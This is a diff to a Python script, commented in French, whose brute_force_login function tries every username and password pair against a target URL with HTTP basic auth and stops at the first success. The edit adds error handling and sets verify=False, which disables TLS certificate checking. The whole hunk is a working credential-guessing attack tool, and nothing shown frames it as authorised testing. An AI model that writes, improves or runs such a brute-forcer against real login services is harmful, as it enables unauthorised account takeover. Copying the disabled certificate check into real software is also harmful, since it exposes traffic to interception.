@@ -51,15 +51,20 @@ def brute_force_login(target_url, usernames, passwords):
     successful_attempts = []
     for username in usernames:
         for password in passwords:
-            # Envoi de la requête POST avec authentification HTTP basique
-            response = requests.post(target_url, auth=HTTPBasicAuth(username, password))
-            # Vérification du statut de la réponse pour déterminer si l'authentification a réussi
-            status = "Succès" if "Login failed" not in response.text and response.status_code == 200 else "Échec"
-            print(f"Essai de {username}:{password} => Statut: {status}")
-            if status == "Succès":
-                successful_attempts.append((username, password, status))
-                # Si une tentative réussit, on arrête le brute force pour ce service
-                return successful_attempts
+            try:
+                # Envoi de la requête POST avec authentification HTTP basique et désactivation de la vérification SSL
+                response = requests.post(target_url, auth=HTTPBasicAuth(username, password), verify=False)
+                # Vérification du statut de la réponse pour déterminer si l'authentification a réussi
+                status = "Succès" if "Login failed" not in response.text and response.status_code == 200 else "Échec"
+                print(f"Essai de {username}:{password} => Statut: {status}")
+                if status == "Succès":
+                    successful_attempts.append((username, password, status))
+                    # Si une tentative réussit, on arrête le brute force pour ce service
+                    return successful_attempts
+            except requests.exceptions.SSLError as e:
+                print(f"Erreur SSL pour l'URL {target_url} : {e}")
+            except requests.exceptions.RequestException as e:
+                print(f"Erreur lors de la requête HTTP : {e}")
     return successful_attempts
 
 # Charger les utilisateurs et mots de passe depuis les fichiers
